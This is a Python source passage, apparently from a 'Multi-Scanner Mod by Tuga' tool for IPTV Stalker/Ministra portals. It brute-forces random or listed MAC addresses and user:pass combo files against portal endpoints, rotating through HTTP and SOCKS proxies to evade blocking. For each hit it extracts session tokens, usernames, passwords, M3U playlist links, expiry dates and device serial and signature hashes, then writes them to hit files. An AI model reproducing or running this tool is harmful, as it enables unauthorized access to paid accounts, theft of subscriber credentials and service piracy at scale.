╭──➤ 🔲 🅼3🆄 🄲🄷🄴🄲🄺
├● ❪🔘❫ 𝙎𝙏𝘼𝙏𝙐𝙎 𝙇𝙄𝙉𝙆 ➤ 
├● """+link_status+"""
├● ❪🔘❫ 𝙎𝙏𝘼𝙏𝙐𝙎 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ➤ 
├● 🛑 OFFLINE
╰─◉ 📺 𝙈3𝙐 ➤ """+m3ulink+"""
     """
        		  	   
    		    except:
        		  	 m3uoffline+=1
        		  	 m3u_url="""
╭──➤ 🔲 🅼3🆄 🄲🄷🄴🄲🄺
├➤ ▣ 𝙎𝙏𝘼𝙏𝙐𝙎 𝙇𝙄𝙉𝙆 ➤ 
├● """+link_status+"""
├➤ ▣ 𝙎𝙏𝘼𝙏𝙐𝙎 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ➤ 
├● 🛑 OFFLINE
╰─◉ ▣ m3u ➩ """+m3ulink+"""
    """
    
    		if serieslist == "":
    		    serie_url=" "
    		else:    		
    		    serie_url="""
    
╭─◉ 🆂🅴🆁🅸🅴🆂 🅻🅸🆂🆃 ─○○
╰─➤ """+serieslist
    
    		if livelist == "":
    		    live_url=" "
    		else:    		
    		    live_url="""
    
╭─◉ 🅻🅸🆅🅴 🅻🅸🆂🆃 ─○○
╰─➤ """+livelist
    
    		if vodlist == "":
    		    vod_url=" "
    		else:    		
    		    vod_url="""
    
╭─◉ 🆅🅾🅳 🅻🅸🆂🆃 ─○○
╰─➤ """+vodlist
    
    		if status == "error":
    		    status_info="""
    		    		    
╭──➤ 📡 🅾🅽🅻🅸🅽🅴 🅃🄴🅂🅃
├● ▣ ❓ 𝙄𝙈𝘼𝙂𝙀 ➤ Not Checked
├◉ 🌐 Vpn ➤ """+str(vpn)+"""
╰────────────────⧳"""
    		else:    		
    		    status_info="""
    		    
╭──➤ 📡 🅾🅽🅻🅸🅽🅴 🅃🄴🅂🅃
├● ▣ 𝙄𝙈𝘼𝙂𝙀 ➤ """+str(status)+"""
├◉ 🌐 Vpn ➤ """+str(vpn)+"""
╰────────────────⧳"""		    		    
    				  		
    		if statusproxym==1:
    			modeprint="""
╭─➤ [ 🔓 𝓟𝓡𝓞𝓧𝓨 𝓜𝓞𝓓𝓔 ]
╰──◉ Proxy ➤ """+proxysprint  			
    		else:
    			modeprint=""    

    		    
    		signature="""
╭─➤ ♦️ 🅼🆄🅻🆃🅸 - 🆂🅲🅰️🅽🅽🅴🆁 ♦️ 
╰────[ Mod by Tuga ]
"""+modeprint+"""
╭──➤ ❪❪ 🌐 🅂🄴🅁🅅🄴🅁 🌐 ❫❫    		
├◉ 🌍 Real ➤ 
├● """+str(real.replace('/stalker_portal','').replace('/c',''))+"""
├◉ 🌐 Panel ➤ 
╰─● http://"""+str(panel)+"""
    	
╭──➤ ❪❪ 🔌 🄲🄾🄽🄽🄴🄲🅃 🔌 ❫❫
├● 🔢 Mac ➤"""+str(mac)+"""
├● 📅 """+str(dat)+  """
╰────────────────⧳

 """+str(stalkerdata)+""""""+status_info+""""""+m3u_url+"""

╭─➤ 🔐 🔹ᴅᴇᴠɪᴄᴇ ᴇɴᴄʀʏᴘᴛɪᴏɴ🔹
├◉ 🔑 𝐒𝐍 ➤ """+SNENC+"""
├◉ 🔑 𝐒𝐍𝐂𝐔𝐓 ➤ """+SNCUT+"""
├◉ 🔑 𝐃𝐄𝐕𝐈𝐂𝐄 𝟏 ➤ """+DEVENC+"""
├◉ 🔑 𝐃𝐄𝐕𝐈𝐂𝐄 𝟐 ➤ """+SINGENC+"""
╰─◉ 🔑 𝙎𝙄𝙉𝙂𝙉𝘼𝙏𝙐𝙍𝙀 ➤ """+SINGENC+"""
    
    """
    		if  channelcate=="1":
    			signature=signature+live_url			
    		elif channelcate=="2":
    			signature=signature+live_url+vod_url
    		elif channelcate=="3":
    			signature=signature+live_url+vod_url+serie_url
    
    		write(signature)
    		
    		hitprint=hitprint+1
    		#print(signature)
    		if hitprint >= hitc:
    			hitr=""
    		
    	except:pass
    
    hitr=""
    
    def data_server(scountry):
    
        flag=''
        country=''
        origin=''
        
        try:
            codecountry=scountry
            flag=flag.flag(codecountry)
            origin=flag
        except:pass
        return origin
    
    
    	
    def vpnip(ip):
    	
    	url9="https://freegeoip.app/json/"+ip
    	vpnip=""
    	data=""
    	try:
    		res = option.get(url9,  timeout=7, datafy=False)
    		data=str(res.text)
    		if not '404 page' in data:
    			vpnips=data.split('"country_name":"')[1]
    			vpn=vpnips.split('"')[0]
    		else:
    			vpn="🕶️ Anonymous"
    	except:
    		vpn="🕶️ Anonymous"
    	return vpn
    
    def image(link,panel):
    	try:
    		res = option.get(link,  headers=hea3(panel), timeout=(2,5), allow_redirects=False,stream=True)
    		code=res.status_code
    		clear="🔒 🅻🅾🅲🅺🅴🅳       "
    		if res.status_code==302 or res.status_code==206:
    			 clear="✅ 🅾️🅽🅻🅸🅽🅴        "
    	except:
    		clear="🔒 🅻🅾🅲🅺🅴🅳      "
    		
    
    	return clear
    
    tokenr="🔘"								
    def hitprint(mac,dat):
    	sesfile="./sound/bone_sound.mp3"
    	file = pathlib.Path(sesfile)
    	try:
    		if file.exists():
    		    ad.mediaPlay(sesfile)
    		    
    	except:pass
    
    def list(listlink,macs,token,livel,panel):
    	category=""
    	data=""
    	bag=0
    	while True:
    		try:
    			res = option.get(listlink,  headers=hea2(macs,token,panel), timeout=15, datafy=False)
    			data=str(res.text)
    			break
    		except:
    			bag=bag+1
    			time.sleep(1)
    			if bag==12:
    				break
    			
    	if data.count('title":"')>1:
    			for i in data.split('title":"'):
    				try:
    					channel=""
    					channel= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
    				except:pass
    				category=category+channel+livel
    	category=category.replace("{","")
    	list=category
    	return list

    	
    def m3uapi(playerlink,macs,token,panel):
    	mt=""
    	bag=0
    	
    	while True:
    			try:
    				res = option.get(playerlink, headers=hea2(macs,token,panel), timeout=7, datafy=False)
    				data=""
    				data=str(res.text)    				
    				break
    			except:    			
    				time.sleep(1)
    				bag=bag+1
    				if bag==6:
    					break
    	try:
    			acon=""
    			if 'active_cons' in data:
    				acon=data.split('active_cons":')[1]
    				acon=acon.split(',')[0]
    				acon=acon.replace('"',"")
    				mcon=data.split('max_connections":')[1]
    				mcon=mcon.split(',')[0]
    				mcon=mcon.replace('"',"")
    				status=data.split('status":')[1]
    				status=status.split(',')[0]
    				status=status.replace('"',"")
    				timezone=data.split('timezone":"')[1]
    				timezone=timezone.split('",')[0]
    				timezone=timezone.replace("\/","/")
    				realm=data.split('url":')[1]
    				realm=realm.split(',')[0]
    				realm=realm.replace('"',"")
    				port=data.split('port":')[1]
    				port=port.split(',')[0]
    				port=port.replace('"',"")
    				userm=data.split('username":')[1]
    				userm=userm.split(',')[0]
    				userm=userm.replace('"',"")
    				pasm=data.split('password":')[1]
    				pasm=pasm.split(',')[0]
    				pasm=pasm.replace('"',"")
    				expirem=""
    				expirem=data.split('exp_date":')[1]
    				expirem=expirem.split(',')[0]
    				expirem=expirem.replace('"',"")

    				message=data.split('message":"')[1].split(',')[0].replace('"','')
    				message=str(message.encode('utf-8').decode("unicode-escape")).replace('\/','/')
    				if status=="Active":
    					statusp="\n├─➤ ✅ Status ➩ "+status	
    				else:
    					status="\n├─➤ 🛑 Status ➩ "+status	
    				
    				if message=="":
    					message_info=""
    				else:
    					message_info="\n├─➤ ▣ Message ➩ "+str(message)
    				
    				
    	
    				if expirem=="null":
    					expirem="Unlimited"
    				else:
    					expirem=(datetime.datetime.fromtimestamp(int(expirem)).strftime('%d-%m-%Y %H:%M:%S'))    					    					
    				mt=("""╭➤ ❪❪ 💎 Portal.php 💎 ❫❫"""+statusp+"""
├➤ ▣ User ➩ """+userm+"""
├➤ ▣ Pass ➩ """+pasm+"""
├──➤ ▣ Act. Con. ➩ """+acon+"""
├──➤ ▣ Max. Con. ➩ """+mcon+""""""+message_info+""" 
├➤ ▣ TimeZone ➩ """+timezone+"""    
╰──────────────⧳  """)
    	except:pass
    	return mt
    scanend=0
    pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"		
    panelcount=0	
    bots =0
    botcount=0
    end=""
    def echok(mac,bot,total,totalc,hitc,odds,oddsc,tokenr,panel):
    	global panelc, scanend, proxyslen
    	global hitr, echo, m3uonline, m3uoffline
    	global proxysok, proxysoklen,proxysbad, proxysbadlen
    	response=""
    	num_serv=0
    	
    	if statusproxym==1:    		
    		proxi="""
        
╭───➤ 🅿️🆁🅾️🆇🅸🅴🆂 🅸🅽🅵🅾 ➤ 
├◉ TOTAL ➤ """+str(proxyslen)+"""
├● 🔴 BAD ➤ """+str(proxysbadlen)+""" 
╰─● 🟢 GOOD ➤ """+str(proxysoklen)+"""        
        
    		"""
    	else:
    		proxi=""   	
    	if multipanel == "1":    	
    		for l in panelc:
    			num_serv=len(l)
    	if num_serv==0:
    		num_serv=1
    	if options=="S":
    		scan="Stalker_portal"
    	else:    	
    			scan="Portal.php"	     
    	if scanend==1:
    			scanend=2
    			end="""
    			
    			   			
╭──────➤  ☢️ 🆂🅲🅰🅽 🅴🅽🅳 ☢️
╰─⧳ DON'T BE A COPY & PASTE """
    	else:
    			end=""

    	urlip = 'http://httpbin.org/ip'
    	try:        
    			response = option.get(urlip, headers=headers, timeout=5).text   			
    	except:pass

   
      			
    	echo=("""
╭─➤ ♦️ 🅼🆄🅻🆃🅸 - 🆂🅲🅰️🅽🅽🅴🆁 ♦️ 
├────[ Mod by Tuga ]  
╰─────────────────────⧳

╭─➤ 🅸🅽🅵🅾 🆂🅴🆁🆅🅴🆁 [ """+scan+""" ]
├◉ 🔢 Mac ➤ """+str(mac)+   """
╰─◉ 🌐 Panel ➤ """+str(panel.replace('/stalker_portal','').replace('/c',''))+  """

╭───➤ 🅸🅽🅵🅾 🆂🅲🅰️🅽 ➤
├◉ 📊 Total ➤ """+str(totalc)+"""/"""+str(macupset)+"""  [%"""+str(oddsc)+"""]
├◉ 🎲 Hits ➤ """+str(hitc)+  """"""+hitr+""" 
├◉ 🛅 Nr. Panels ➤ """+str(num_serv)+       """
╰─◉ 🤖 Bots ➤ """+str(optionbots)+"""

╭───➤ 🅸🅽🅵🅾 🅼3️⃣🆄 ➤
├● 🔴 OFFLINE ➤ """+str(m3uoffline)+"""
╰──● 🟢 ONLINE ➤ """+str(m3uonline)+"""            
"""+proxi+"""
"""+end+"""          """)
    		
    oddsc=0
    totalc=0	
    def gui():                   
        while True:              
            global scanend, m3uonline,panelc,echo, mac,bot,total,totalc,hitc,odds,oddsc,tokenr,panel            
            try:
                if totalc <= total:                
                    totalc=total
                if oddsc <= odds:
                    oddsc=odds                                  
            except:pass
            time.sleep(0.5)           
            echok(mac,bot,total,totalc,hitc,odds,oddsc,tokenr,panel)          
            subprocess.run(["clear", ""])
            statusproxy()
            print(Tuga)  
            print(echo)
            time.sleep(0.5)
            if scanend==2:
                quit()      
            

    def run(optionbots):
        runbots=0
        global panelcount,botcount
        while runbots <= optionbots:
            if optionbots==1: 
                time.sleep(1)          
            t1 = threading.Thread(target=d1)
            t1.start()            
            panelcount=0
            runbots+=1
            botcount=botcount+1                        
        startgui = threading.Thread(target=gui)
        startgui.start()
        
    total=0    
    proxyr=0
    selectprox=0
    def randomproxy():    
        global selectprox, proxysok, proxyslen, checkproxyend
        dirp='/sdcard/proxy/'
        count=0    
        for files in os.listdir (dirp):
            count+=1
            if str(proxyfile)==str(count):
                pfile=(dirp+files)            
                #break            
        proxyf=open(pfile).readlines()
    
        proxyslen=len(proxyf)
        if selectprox==proxyslen:
            proxys=random.choice(proxysok)
            checkproxyend=1      
        else:
            selectprox+=1
            proxys=(proxyf[selectprox])    
        return proxys

    def myip():        
        url = 'http://httpbin.org/ip'
        try:
            ip = option.get(url, headers=headers, timeout=5).text        
        except:pass

        
    proxysok=[]
    proxysoklen=0
    proxysbad=[]
    proxysbadlen=0
    checkproxyend=0
    def d1():
    	global proxysok, proxysoklen,proxysbad, proxysbadlen, checkproxyend
    	global hitc
    	global hitr, scanend
    	global tokenr,bots,panelcount,botcount,bot
    	global panelc, totalc, m3uonline
    	global mac,bot,total,hitc,odds,tokenr,panel
    	count=0
    	    	
    	dir='/sdcard/combo/'   
    	if multipanel=="1":
    		for files in os.listdir (dir):
    			count+=1    
    			if panels==str(count):
    				pfile=(dir+files)            
    				break    
    		panelc=open(pfile).read().splitlines()
    		panel=random.choice(panelc)
    	else:
    		panel=optional

    	panel=panel.replace("http://","")
    	panel=panel.replace("/c","")
    	panel=panel.replace("/","")
    	panel=panel.replace('stalker_portal','/stalker_portal')
    	
    
    	bots=bots+1
    	botc=bots
    	
    	for mc in range(botcount,macupset,1):	 
    		if total==macupset:
    		    scanend=1
    		    break
    		    quit()    		    
    		
    		if statusproxym==0:    
    		    total=total+1
    		else:
        		time.sleep(0.1)   		    		
        
    		if filnr=="0":
    		    mac=randommac()
    		else:
    		    mac=mactotLen[mc].replace('\n','')
    		    macv=re.search(pattern,mactotLen[mc],re.IGNORECASE)
    		    if macv:
    		        mac=macv.group()
    		    else:
    		         continue
    		macs=mac.upper().replace(':','%3A')
    		#mac="00:1A:79:00:3B:9D"		
    		#macs="00:1A:79:00:3B:9D"
    		bot="Bot_"+str(botc)
    		odds=""
    		odds=round(((total)/(macupset)*100),2)    		    		    		  		
    		bag=0
    		data=""
    		proxysprint="" 
    		while True:
    			proxyr=0    									    	    			
    			if protocol==1:
        			proxys=randomproxy()
        			proxysprint=proxys        			          
        			proxy.proxies = {
        			'https': proxys ,
        			'http': proxys
        			}
    			if protocol==2:
        			proxys=randomproxy()
        			proxysprint=proxys        			          
        			proxy.proxies = {
        			'https': 'socks4://'+proxys ,
        			'http': 'socks4://'+proxys
        			}  
    			if protocol==3:
        			proxys=randomproxy()
        			proxysprint=proxys        			          
        			proxy.proxies = {
        			'https': 'socks5://'+proxys ,
        			'http': 'socks5://'+proxys
        			}        			      		
    			if multipanel=="1":
 										       			
    				#tokenr="🔘"
    				panel=random.choice(panelc)
    				panel=panel.replace("http://","")
    				panel=panel.replace("/c","")
    				panel=panel.replace("/","")
    				panel=panel.replace('stalker_portal','/stalker_portal')			
    			try:
    				#myip()   									         			
    				res = option.get(url1(panel), headers=hea1(panel,macs), timeout=15, datafy=False)
    				data=str(res.text)
    				break
    			except:
    				if statusproxym==1:         		        		
    				 if proxys in proxysbad:
    				  time.sleep(0.1)
    				  proxyr=1
    				 else:
    				  if checkproxyend==0:
    				   proxysbad+=[proxys]
    				  proxysbadlen=len(proxysbad)
    				  proxyr=1
    				bag=bag+1
    				time.sleep(0.5)
    				if bag==5:
    					break
    		tokenr="🔴"
    		if proxyr==0:
        		if statusproxym==1:    
        			total=total+1        		        		
        			if proxys in proxysok:
        				time.sleep(0.1)
        			else:
        				if checkproxyend==0:           
        				 proxysok+=[proxys]
        				proxysoklen=len(proxysok)        
        		if 'token' in data:
        			tokenr="🔘"
        			token=data.replace('{"js":{"token":"',"")
        			token=token.split('"')[0]
        			bag=0
        			
        			while True:
        			   try:
        			     res = option.get(url22(panel,macs), headers=hea2(macs,token,panel), timeout=15, datafy=False)
        			     data=""
        			     data=str(res.text)
        			     data_stalkerp=""
        			    
        			     data_stalkerp=data
        			     isstalker=''
        			     if 'stalker_portal' in data_stalkerp:
        			         isstalker='S'
        			     else:
        			         isstalker='N'
        			         
        			     break
        			   except: 				     	
        			     bag=bag+1
        			     time.sleep(1)
        			   if bag==5:
        			     break
        			id="null"
        			ip=""
        			try:
        			     id=data.split('{"js":{"id":')[1]
        			     id=id.split(',"name')[0]
        			     ip=data.split('ip":"')[1]
        			     ip=ip.split('"')[0]
        			   
        			except:pass
        			if not id=="null":
        			    bag=0
        			    while True:
        			     	try:
        				     	res = option.get(url3(panel), headers=hea2(macs,token,panel), timeout=15, datafy=False)
        				     	data=""
        				     	data=str(res.text)
        				     	data_stalker=""
        				     	data_stalker=data
        				     	break
        			     	except:
        				     	print("test 2")
        				     	bag=bag+1
        				     	time.sleep(1)
        				     	if bag==5:
        				     		break
        			    if not data.count('phone')==0:
        			     	hitr=" 💾 ..."
        			     	hitc=hitc+1
        			     	dat=""
        			     	if 'end_date' in data:	
        			     		dat=data.split('end_date":"')[1]
        			     		dat=dat.split('"')[0]
        			     		
        			     	else:
        			     		  try:
        			     		      dat=data.split('phone":"')[1]
        			     		      dat=dat.split('"')[0]
        			     		      if dat.lower()[:2] =='un':
        			     		      	 RemainingDays=(" Days")
        			     		      else:
        			     		      	 RemainingDays=(str(date_clear(dat))+" Days")
        			     		      dat='Exp. in '+ RemainingDays
        			     		  except:pass
        			     	
        			   
        			     	hitprint(mac,dat)
        			     	bag=0
        			     	while True:
        			     		try:
        			     			#print(str(url6(panel)+"6"))
        				     		res = option.get(url6(panel), headers=hea2(macs,token,panel), timeout=10, datafy=False)
        				     		data=""
        				     		data=str(res.text)
        				     		cid=""
        				     		cid=(str(res.text).split('ch_id":"')[100].split('"')[0])
        				     		#print(data)	     		
        				     		break
        				     	except:    				     		
        				     		bag=bag+1
        				     		time.sleep(0.5)
        				     		if bag==5:
        				     			#quit()
        				     			cid="94067"
        				     			break
        			     	real=panel
        			     	m3ulink=""
        			     	user=""
        			     	pas=""
        			     	status="error"
        			     	bag=0
        			     	if options=="S":
        			     		try: 
        			     			url="http://"+panel+"/"+portalm+"?type=itv&action=create_link&cmd=ffrt%20http://localhost/ch/"+str(cid)
        			     			res = option.get(url, headers=hea2(macs,token,panel), timeout=15, datafy=False)
        			     			datas=""
        			     			datas=str(res.text)			     	
        			     			link=datas.split('cmd":"')[1].split('"')[0].replace('\/','/')
        			     			status=image(link,panel)
        			     		except:pass	    			
        			     	while True:
        			     		try:
        				     		url="http://"+panel+"/"+portalm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
        				     		res = option.get(url, headers=hea2(macs,token,panel), timeout=15, datafy=False)
        				     		data=""
        				     		data=str(res.text)
        				     		    				     		
        				     		link=data.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
        				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
        				     		user=str(link.replace('live/','').split('/')[3])
        				     		pas=str(link.replace('live/','').split('/')[4])
        				     		m3ulink="http://"+real.replace('http://','').replace('/c/', '')+"/get.php?username="+str(user)+"&password="+str(pas)+"&type=m3u_plus&output=m3u8" 
        				     		status=image(link,panel)
        				     		break
        				     		print(data)				     		
        				     	except:    				     		 
        				     		bag=bag+1
        				     		time.sleep(0.1)
        				     		if bag==5:
        				     			break
        			     	playerapi=""
        			     	if not m3ulink=="":
        			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
        			     		
        			     		playerapi=m3uapi(playerlink,macs,token,panel)
        			     		if playerapi=="":
        			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
        			     			playerapi=m3uapi(playerlink,macs,token,panel)
        			     			
    
        			     	dstalker=""
        			     	if not m3ulink=="":
        			     		    playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
        			     		    playerapi=m3uapi(playerlink,macs,token,panel)
        			     		    if playerapi=="":
        			     		        playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
        			     		        playerapi=m3uapi(playerlink,macs,token,panel)			     						     			
        			     			
        			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
        			     	SNENC=SN.upper()
        			     	SNCUT=SNENC[:13]
        			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
        			     	DEVENC=DEV.upper()
        			     	SG=SNCUT+'+'+(mac)
        			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
        			     	SINGENC=SING.upper()
        				     	
        			     	
        			    
        			     	vpn=""
        			     	if not ip =="":
        			     		vpn=vpnip(ip)
        			     	else:
        			     	 	vpn="🕶️ Anonymous"
        			     	livelist=""
        			     	vodlist=""
        			     	serieslist=""
        			     	if channelcate=="1" or channelcate=="2" or channelcate=="3":  	   
        			     		listlink=liveurl(panel) 
        			     		livel="""
    ❪🟢❫➤ """
        			     		livelist=list(listlink,macs,token,livel,panel)
        			     		listlink=vodurl(panel) 			     		
        			     		livel="""
    ❪🟡❫➤ """
        			     		vodlist=list(listlink,macs,token,livel,panel)
        			     		listlink=seriesurl(panel) 
        			     		livel="""
    ❪⚫❫➤ """
        			     		serieslist=list(listlink,macs,token,livel,panel)
        			     	hit(proxysprint,options,mac,dat,real,m3ulink,status,vpn,livelist,vodlist,serieslist,playerapi,panel,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,isstalker,data_stalkerp,data_stalker)
        
        
    run(optionbots)




if selectop=="2": #m3uoption
    
    pattern= "(^\S{2,}:\S{2,}$)|(^.*?(\n|$))"
    subprocess.run(["clear", ""])
    count=0
    hit=0
    find=0
    cpm=1
    
    	
    
    	
    count=0
    fil=""
    dir='/sdcard/combo/'
    statusproxy()
    print(Tuga)
    print("""  
    \33[1;31m \33[0m\33[1;32mꜱᴇʟᴇᴄᴛ ꜰɪʟᴇ ᴄᴏᴍʙᴏ ᴜꜱᴇʀ:ᴘᴀꜱꜱ  \33[36m    
    """)    
    for files in os.listdir (dir):
    	count=count+1
    	fil=fil+"	\33[1;31m"+str(count)+"\33[0m\33[1;32m = \33[0m \33[36m"+files+'\33[36m\n'
    print ("""   	
    """+fil+"""    """)
    
    filnr=str(input("""
\33[36m
Enter ꜰɪʟᴇ : \33[36m\33[36m\33[36m"""))
    count=0
    for files in os.listdir (dir):
    	count=count+1
    	if filnr==str(count):
    		filea=(dir+files)
    		break
    count=0
    
    
    
    
    		
    subprocess.run(["clear", ""])
    statusproxy()
    print(Tuga) 
    print("""
    \33[1;31m \33[0m\33[1;32mꜱᴇʟᴇᴄᴛ ɴᴜᴍʙᴇʀ ʙᴏᴛꜱ\33[36m
    	
    \33[1;31m*\33[0m \33[36m1 - 100 ʀᴇᴄᴏᴍᴍᴇɴᴅᴇᴅ \33[36m
    """)
    optionbots=input("""\33[36m
Enter ʙᴏᴛꜱ : \33[36m\33[36m\33[36m""")
    optionbots=int(optionbots)
     		
    
    HEADERd={
    "Cookie": "stb_lang=en; timezone=Europe%2FLisbon;",
    "X-User-Agent":"Model: MAG254; Link: Ethernet",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip, deflate",
    "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
                }		
         							
    fil=filea
    combo=fil
    file=""
    
       
    	                        
    subprocess.run(["clear", ""])
    statusproxy()
    print(Tuga)     
    print("""
    \33[1;31m \33[0m\33[1;32mꜰɪʟᴇ ꜱᴇʟᴇᴄᴛᴇᴅ: """+fil+"""\33[36m
    	
    \33[1;31m*\33[0m \33[36mᴛʏᴘᴇ ᴘᴀɴᴇʟ ᴛᴏ ꜱᴄᴀɴ \33[36m
    """) 

    panel = input("""\33[36m
Enter ᴘᴏʀᴛᴀʟ : \33[36m\33[36m\33[36m""")
    if panel=="":
        panel="http://flextv.io"
    #=======+++=++++++====++=======
    panel=panel.replace("http://","")
    panel=panel.replace("/c","")
    panel=panel.replace("/","")
    portal=panel    
    channell=""
    subprocess.run(["clear", ""])
    statusproxy()
    print(Tuga) 
    channell=input("""  
    \33[1;31m \33[0m\33[1;32mꜱʜᴏᴡ ᴄᴀᴛᴇɢᴏʀʏ ᴄᴏɴᴛᴇɴᴛ? \33[36m    
    	
    \33[1;31m1 \33[0m\33[1;32m= \33[0m \33[36mYes \33[36m    
    \33[1;31m2 \33[0m\33[1;32m= \33[0m \33[36mNo \33[36m    
        
\33[36m
Enter ᴏᴘᴛɪᴏɴ : \33[36m\33[36m\33[36m""")
    if not channell=="1":
    	channell=2
    subprocess.run(["clear", ""])
    statusproxy()
    print(Tuga) 
    hitn=str(input("""
    \33[1;31m \33[0m\33[1;32mꜰɪʟᴇ ɴᴀᴍᴇ ᴛᴏ ꜱᴀᴠᴇ  \33[36m    
    
\33[36m
Enter ɴᴀᴍᴇ ꜰɪʟᴇ : \33[36m\33[36m\33[36m"""))
    if hitn=="":
    	hitn="Tuga_M3U"	

    c=open(fil, 'r')
    totLen=c.readlines()
    upset=(len(totLen))
    	                                         
    
    def category(catelink):    		
    	#try:
    		res = option.get(catelink,headers=HEADERd, timeout=15, datafy=False)
    		data=""
    		cate=""
    		data=str(res.text)
    		print(data)
    		for i in data.split('category_name":"'):
    			cate=cate+"""
 ❪🟢❫➤ """+str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
    		cate=cate.replace("\n ❪🟢❫➤ [{ ","")
    	#except:pass
    	#print(cate)
    		return cate
    
    def m3u_check(m3u_link):
        links=[]
        global hitr
        try:
            req=str(option.get(m3u_link, timeout=(60), allow_redirects=False,stream=True).status_code)            
            if req == "200" or (req == "302"):
                link_status="✅ ONLINE"
            else:
                link_status="🛑 OFFLINE"        		
        except:
            link_status="🛑 OFFLINE"
        try:
        
            req=option.get(m3u_link,headers=HEADERd,timeout=(60), allow_redirects=False, stream=True)
            m3u_text=(req.text)  
            #print(m3u_text)
            for lines in req.iter_lines():
                #print(lines)
                if "mkv" in str(lines):
                    m3u_check=str(lines).replace("b'"," ").replace("'"," ")
                    print("mkv")
                    break 
                if "mp4" in str(lines):
                    m3u_check=str(lines).replace("b'"," ").replace("'"," ")
                    print("mp4")
                    break                   

            if statusproxym==1:
                invpn="(IN PROXY)"
            else:
                invpn=""
            req=str(option.get(m3u_check,headers=HEADERd, timeout=(180), allow_redirects=False, stream=True).status_code)
            if req == "200" or (req == "302"):
                m3u_result="""
        		  	   
╭──➤ 🔲 🅼3🆄 🄲🄷🄴🄲🄺
├● ❪🔘❫ 𝙎𝙏𝘼𝙏𝙐𝙎 𝙇𝙄𝙉𝙆 ➤ 
├● """+link_status+""" """+invpn+"""
╰─● 📺 𝙈3𝙐 ➤ """+m3u_link+"""

╭─➤ 𝙎𝙏𝘼𝙏𝙐𝙎 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ➤ 
├● ✅ ONLINE """+invpn+"""
╰─● 🎲 𝙋𝙇𝘼𝙔 ➤ """+m3u_check+"""
     """
                print(m3u_result)
            else:
                m3u_result="""
        		  	   
╭──➤ 🔲 🅼3🆄 🄲🄷🄴🄲🄺
├● ❪🔘❫ 𝙎𝙏𝘼𝙏𝙐𝙎 𝙇𝙄𝙉𝙆 ➤ 
├● """+link_status+""" """+invpn+"""
╰─● 📺 𝙈3𝙐 ➤ """+m3u_link+"""

╭─➤ 𝙎𝙏𝘼𝙏𝙐𝙎 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ➤ 
├● 🛑 OFFLINE """+invpn+"""
╰─● 🎲 𝙋𝙇𝘼𝙔 ➤ """+m3u_check+"""
     """
                print(m3u_result)
        except:
            m3u_result="""
        		  	   
╭──➤ 🔲 🅼3🆄 🄲🄷🄴🄲🄺
├● ❪🔘❫ 𝙎𝙏𝘼𝙏𝙐𝙎 𝙇𝙄𝙉𝙆 ➤ 
├● """+link_status+""" """+invpn+"""
╰─● 📺 𝙈3𝙐 ➤ """+m3u_link+"""

╭─➤ 𝙎𝙏𝘼𝙏𝙐𝙎 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ➤ 
├● 🛑 OFFLINE """+invpn+"""
╰─● 🎲 𝙋𝙇𝘼𝙔 ➤ Not URL
     """
            print(m3u_result)
        return m3u_result, link_status  

    
    def approval(data,user,pas,proxysprint):
    		global hitr, fakehit		
    		fakehit=0
    		status=data.split('status":')[1]
    		status=status.split(',')[0]
    		status=status.replace('"',"")    		  		
    		
    		
    		acon=""
    		acon=data.split('active_cons":')[1]
    		acon=acon.split(',')[0]
    		acon=acon.replace('"',"")
    		mcon=data.split('max_connections":')[1]
    		mcon=mcon.split(',')[0]
    		mcon=mcon.replace('"',"")
    		timezone=data.split('timezone":"')[1]
    		timezone=timezone.split('",')[0]
    		timezone=timezone.replace("\/","/")
    		realm=data.split('url":')[1]
    		realm=realm.split(',')[0]
    		realm=realm.replace('"',"")
    		port=data.split('port":')[1]
    		port=port.split(',')[0]
    		port=port.replace('"',"")
    		user=data.split('username":')[1]
    		user=user.split(',')[0]
    		user=user.replace('"',"")
    		passw=data.split('password":')[1]
    		passw=passw.split(',')[0]
    		passw=passw.replace('"',"")
    		expire=data.split('exp_date":')[1]
    		expire=expire.split(',')[0]
    		expire=expire.replace('"',"")
    		if expire=="null":
    			   expire="Unlimited"
    		else:
    			   expire=(datetime.datetime.fromtimestamp(int(expire)).strftime('%Y-%m-%d %H:%M:%S'))
    		expire=expire    		
    		if channell=="1":
    			#myip()
    			print("channel 1") 		
    			catelink="http://"+realm+":"+port+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_categories"  

    			try:
    				category=""
    				print("S. category")
    				res = option.get(catelink,headers=HEADERd,timeout=30,datafy=False)
    				print("Ok")    				
    				data=""
    				cate=""
    				data=str(res.text)
    				#print(data)    				
    				for i in data.split('category_name":"'):
    					#print(i)
    					try:
    					 cate=cate+"""
 ❪🟢❫➤ """+str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
    					except:pass    					  					  					
    					cate=cate.replace(" ❪🟢❫➤ [{","")
    					#print(cate)
    				category=cate    				
    				print(category)
